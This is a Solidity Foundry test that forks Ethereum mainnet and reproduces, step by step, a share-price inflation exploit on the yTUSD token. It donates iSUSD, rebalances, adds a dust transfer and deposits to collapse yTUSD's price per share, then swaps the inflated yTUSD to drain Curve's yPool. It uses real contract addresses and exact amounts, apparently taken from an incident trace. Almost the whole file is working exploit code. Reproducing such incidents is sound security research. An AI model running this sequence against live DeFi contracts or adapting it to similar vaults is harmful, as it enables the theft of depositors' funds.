// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {console2} from "forge-std/console2.sol";
import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC20NoReturn {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
}

interface IUniswapV3SwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

interface IFulcrumIToken is IERC20Metadata {
    function mint(address receiver, uint256 depositAmount) external returns (uint256);
}

interface IYVault is IERC20Metadata {
    function deposit(uint256 amount) external;
    function getPricePerFullShare() external view returns (uint256);
}

interface IPriceHelper {
    function getPrice(address asset) external view returns (uint256);
}

interface IYToken is IERC20Metadata {
    function totalSupply() external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function rebalance() external;
    function provider() external view returns (uint8);
    function calcPoolValueInToken() external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
}

interface ICurveYPool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external;
    function add_liquidity(uint256[4] calldata amounts, uint256 minMintAmount) external;
    function get_virtual_price() external view returns (uint256);
    function balances(int128 i) external view returns (uint256);
    function coins(int128 i) external view returns (address);
}

interface ICurve3Pool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

contract IearnExploitTest is Test {
    uint256 internal constant BLOCK_PRE = 24_027_659;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address internal constant sUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address internal constant sUSDe = 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497;

    address internal constant yDAI = 0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01;
    address internal constant yUSDC = 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e;
    address internal constant yTUSD = 0x73a052500105205d34Daf004eAb301916DA8190f;
    address internal constant iSUSD = 0x49f4592E641820e928F9919Ef4aBd92a719B4b49;

    address internal constant yPOOL = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address internal constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address internal constant CURVE_SUSD_SUSDE_POOL = 0x4b5E827F4C0a1042272a11857a355dA1F4Ceebae;
    address internal constant yCRV = 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8;
    address internal constant yVAULT = 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c;
    address internal constant PRICE_HELPER = 0xFCdeF208ecCB87008B9F2240c8bc9b3591E0295C;
    address internal constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    uint256 internal constant USDC_SEED = 30_000_000e6;
    uint256 internal constant TUSD_SEED = 2_000_000e18;

    uint256 internal constant YUSDC_DEPOSIT = 60_000e6;
    uint256 internal constant YUSDC_TO_YTUSD_DX = 46_578_601_841; // from trace
    uint256 internal constant YUSDC_DEPOSIT_FOR_LP = 10_000_000e6;
    uint256 internal constant USDC_TO_DAI_DX = 11_000_000e6;
    uint256 internal constant USDC_TO_USDT_DX = 200_000e6;

    uint256 internal constant TUSD_DEPOSIT_1 = 1169030283812964608450554; // 1,169,030.283812964608450554
    uint256 internal constant ISUSD_DONATION = 213848030480998433828584; // 213,848.030480998433828584
    uint256 internal constant SUSD_FOR_ISUSD_MINT = 215192931789489849544491; // 215,192.931789489849544491
    uint256 internal constant YTUSD_WITHDRAW_SHARES = 769318060321814735010119; // 769,318.060321814735010119

    uint256 internal constant TUSD_DUST_TRANSFER = 1_000_000_000; // 1e-9 TUSD
    uint256 internal constant TUSD_DEPOSIT_2 = 1_000e18;

    uint256 internal constant YTUSD_TO_YUSDC_DX = 9_000_000e18;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), BLOCK_PRE);

        vm.label(USDC, "USDC");
        vm.label(USDT, "USDT");
        vm.label(DAI, "DAI");
        vm.label(TUSD, "TUSD");
        vm.label(sUSD, "sUSD");
        vm.label(sUSDe, "sUSDe");
        vm.label(yDAI, "yDAI");
        vm.label(yUSDC, "yUSDC");
        vm.label(yTUSD, "yTUSD");
        vm.label(iSUSD, "iSUSD");
        vm.label(yPOOL, "Curve:yPool");
        vm.label(CURVE_3POOL, "Curve:3pool");
        vm.label(CURVE_SUSD_SUSDE_POOL, "CurveV2:sUSD+sUSDe");
        vm.label(yCRV, "yCRV");
        vm.label(yVAULT, "Yearn:yVault(yCRV)");
        vm.label(PRICE_HELPER, "PriceHelper");
        vm.label(UNISWAP_V3_ROUTER, "UniswapV3:SwapRouter");
    }

    function test_exploit_yTUSDInflation_drainsCurveYPool() public {
        address attacker = makeAddr("attacker");
        vm.label(attacker, "attacker");

        deal(USDC, attacker, USDC_SEED);
        deal(TUSD, attacker, TUSD_SEED);

        _logSystemState("pre", attacker);

        vm.startPrank(attacker);

        _buyInitialYTUSD(attacker);
        _setupVaultCollateral(attacker);
        _inflateYTUSD(attacker);
        _drainYPool(attacker);

        vm.stopPrank();

        _logSystemState("post", attacker);

        assertLt(ICurveYPool(yPOOL).get_virtual_price(), 1e16, "expected yPool virtual price collapse");
    }

    function _buyInitialYTUSD(address attacker) internal {
        IERC20(USDC).approve(yUSDC, type(uint256).max);
        IYToken(yUSDC).deposit(YUSDC_DEPOSIT);

        IERC20(yUSDC).approve(yPOOL, type(uint256).max);
        ICurveYPool(yPOOL).exchange(1, 3, YUSDC_TO_YTUSD_DX, 0);
        emit log_named_decimal_uint("attacker yTUSD after yPool buy", IERC20(yTUSD).balanceOf(attacker), 18);
    }

    function _setupVaultCollateral(address attacker) internal {
        IYToken(yUSDC).deposit(YUSDC_DEPOSIT_FOR_LP);

        IERC20(USDC).approve(CURVE_3POOL, type(uint256).max);
        ICurve3Pool(CURVE_3POOL).exchange(1, 0, USDC_TO_DAI_DX, 0);

        IERC20(DAI).approve(yDAI, type(uint256).max);
        IYToken(yDAI).deposit(IERC20(DAI).balanceOf(attacker));

        IERC20(yUSDC).approve(yPOOL, type(uint256).max);
        IERC20(yDAI).approve(yPOOL, type(uint256).max);

        uint256[4] memory lpAmounts = [IERC20(yDAI).balanceOf(attacker), IERC20(yUSDC).balanceOf(attacker), 0, 0];
        uint256 yCrvBefore = IERC20(yCRV).balanceOf(attacker);
        ICurveYPool(yPOOL).add_liquidity(lpAmounts, 0);
        emit log_named_decimal_uint("yCRV minted from add_liquidity", IERC20(yCRV).balanceOf(attacker) - yCrvBefore, 18);

        IERC20(yCRV).approve(yVAULT, type(uint256).max);
        uint256 yVaultSharesBefore = IERC20(yVAULT).balanceOf(attacker);
        IYVault(yVAULT).deposit(IERC20(yCRV).balanceOf(attacker));
        emit log_named_decimal_uint("yVault shares minted from yCRV deposit", IERC20(yVAULT).balanceOf(attacker) - yVaultSharesBefore, 18);
    }

    function _inflateYTUSD(address attacker) internal {
        IERC20(TUSD).approve(yTUSD, type(uint256).max);
        uint256 yTUSDBeforeDeposit = IERC20(yTUSD).balanceOf(attacker);
        IYToken(yTUSD).deposit(TUSD_DEPOSIT_1);
        emit log_named_decimal_uint("yTUSD minted from deposit", IERC20(yTUSD).balanceOf(attacker) - yTUSDBeforeDeposit, 18);

        _acquireSUSD(attacker);
        assertGe(IERC20(sUSD).balanceOf(attacker), SUSD_FOR_ISUSD_MINT, "insufficient sUSD for iSUSD mint");

        IERC20(sUSD).approve(iSUSD, type(uint256).max);
        uint256 iSUSDMinted = IFulcrumIToken(iSUSD).mint(attacker, SUSD_FOR_ISUSD_MINT);
        emit log_named_decimal_uint("iSUSD minted", iSUSDMinted, 18);
        assertGe(iSUSDMinted, ISUSD_DONATION, "unexpected iSUSD mint amount");

        IERC20(iSUSD).transfer(yTUSD, ISUSD_DONATION);
        emit log_named_decimal_uint("iSUSD donated to yTUSD", IERC20(iSUSD).balanceOf(yTUSD), 18);
        emit log_named_decimal_uint("yTUSD calcPoolValueInToken (with iSUSD)", IYToken(yTUSD).calcPoolValueInToken(), 18);

        uint256 tusdBeforeWithdraw = IERC20(TUSD).balanceOf(attacker);
        IYToken(yTUSD).withdraw(YTUSD_WITHDRAW_SHARES);
        emit log_named_decimal_uint("TUSD received from yTUSD.withdraw", IERC20(TUSD).balanceOf(attacker) - tusdBeforeWithdraw, 18);

        emit log_named_uint("yTUSD provider enum", IYToken(yTUSD).provider());
        IYToken(yTUSD).rebalance();
        emit log_named_uint("yTUSD provider enum (post-rebalance)", IYToken(yTUSD).provider());

        IERC20(TUSD).transfer(yTUSD, TUSD_DUST_TRANSFER);
        emit log_named_decimal_uint("yTUSD TUSD balance after dust transfer", IERC20(TUSD).balanceOf(yTUSD), 18);

        uint256 yTUSDBeforeInflation = IERC20(yTUSD).balanceOf(attacker);
        IYToken(yTUSD).deposit(TUSD_DEPOSIT_2);
        uint256 yTUSDInflationMint = IERC20(yTUSD).balanceOf(attacker) - yTUSDBeforeInflation;
        emit log_named_uint("yTUSD inflation mint (raw)", yTUSDInflationMint);
        emit log_named_decimal_uint("yTUSD inflation mint", yTUSDInflationMint, 18);

        uint256 ppsAfter = IYToken(yTUSD).getPricePerFullShare();
        emit log_named_decimal_uint("yTUSD pricePerFullShare after inflation", ppsAfter, 18);
        assertLt(ppsAfter, 1e8, "expected yTUSD pricePerFullShare collapse");
        assertGt(IYToken(yTUSD).totalSupply(), 1e34, "expected yTUSD totalSupply inflation");
    }

    function _acquireSUSD(address attacker) internal {
        IERC20(USDC).approve(CURVE_3POOL, type(uint256).max);
        uint256 usdtBeforeSwap = IERC20NoReturn(USDT).balanceOf(attacker);
        ICurve3Pool(CURVE_3POOL).exchange(1, 2, USDC_TO_USDT_DX, 0);
        uint256 usdtReceived = IERC20NoReturn(USDT).balanceOf(attacker) - usdtBeforeSwap;
        emit log_named_decimal_uint("USDT received from 3pool swap (USDC->USDT)", usdtReceived, 6);

        IERC20NoReturn(USDT).approve(UNISWAP_V3_ROUTER, type(uint256).max);
        uint256 susdeReceived = IUniswapV3SwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(
            IUniswapV3SwapRouter.ExactInputSingleParams({
                tokenIn: USDT,
                tokenOut: sUSDe,
                fee: 100,
                recipient: attacker,
                deadline: block.timestamp + 1,
                amountIn: usdtReceived,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        emit log_named_decimal_uint("sUSDe received from UniswapV3 swap (USDT->sUSDe)", susdeReceived, 18);

        IERC20(sUSDe).approve(CURVE_SUSD_SUSDE_POOL, type(uint256).max);
        uint256 susdBeforeSwap = IERC20(sUSD).balanceOf(attacker);
        ICurve3Pool(CURVE_SUSD_SUSDE_POOL).exchange(1, 0, susdeReceived, 0);
        emit log_named_decimal_uint(
            "sUSD received from CurveV2 swap (sUSDe->sUSD)",
            IERC20(sUSD).balanceOf(attacker) - susdBeforeSwap,
            18
        );
    }

    function _drainYPool(address attacker) internal {
        IERC20(yTUSD).approve(yPOOL, type(uint256).max);

        ICurveYPool(yPOOL).exchange(3, 1, YTUSD_TO_YUSDC_DX, 1);
        emit log_named_decimal_uint("attacker yUSDC after swap(3->1)", IERC20(yUSDC).balanceOf(attacker), 6);

        ICurveYPool(yPOOL).exchange(3, 0, IERC20(yTUSD).balanceOf(attacker), 1);
        emit log_named_decimal_uint("attacker yDAI after swap(3->0)", IERC20(yDAI).balanceOf(attacker), 18);
    }

    function _logSystemState(string memory tag, address attacker) internal {
        console2.log("");
        console2.log("========", tag, "========");
        console2.log("block.number", block.number);

        emit log_named_decimal_uint("yPool.get_virtual_price()", ICurveYPool(yPOOL).get_virtual_price(), 18);
        emit log_named_decimal_uint("PriceHelper.getPrice(yVault)", IPriceHelper(PRICE_HELPER).getPrice(yVAULT), 18);
        emit log_named_decimal_uint("yPool.balances[0] (yDAI)", ICurveYPool(yPOOL).balances(0), 18);
        emit log_named_decimal_uint("yPool.balances[1] (yUSDC)", ICurveYPool(yPOOL).balances(1), 6);
        emit log_named_decimal_uint("yPool.balances[2] (yUSDT)", ICurveYPool(yPOOL).balances(2), 6);
        emit log_named_decimal_uint("yPool.balances[3] (yTUSD)", ICurveYPool(yPOOL).balances(3), 18);

        emit log_named_decimal_uint("yTUSD.totalSupply()", IYToken(yTUSD).totalSupply(), 18);
        emit log_named_decimal_uint("yTUSD.calcPoolValueInToken()", IYToken(yTUSD).calcPoolValueInToken(), 18);
        emit log_named_decimal_uint("yTUSD.getPricePerFullShare()", IYToken(yTUSD).getPricePerFullShare(), 18);
        emit log_named_decimal_uint("TUSD.balanceOf(yTUSD)", IERC20(TUSD).balanceOf(yTUSD), 18);
        emit log_named_decimal_uint("iSUSD.balanceOf(yTUSD)", IERC20(iSUSD).balanceOf(yTUSD), 18);
        emit log_named_decimal_uint("sUSD.balanceOf(yTUSD)", IERC20(sUSD).balanceOf(yTUSD), 18);

        emit log_named_decimal_uint("attacker USDC", IERC20(USDC).balanceOf(attacker), 6);
        emit log_named_decimal_uint("attacker TUSD", IERC20(TUSD).balanceOf(attacker), 18);
        emit log_named_decimal_uint("attacker yUSDC", IERC20(yUSDC).balanceOf(attacker), 6);
        emit log_named_decimal_uint("attacker yTUSD", IERC20(yTUSD).balanceOf(attacker), 18);
        emit log_named_decimal_uint("attacker yDAI", IERC20(yDAI).balanceOf(attacker), 18);
        emit log_named_decimal_uint("attacker iSUSD", IERC20(iSUSD).balanceOf(attacker), 18);
        emit log_named_decimal_uint("attacker sUSD", IERC20(sUSD).balanceOf(attacker), 18);
    }
}
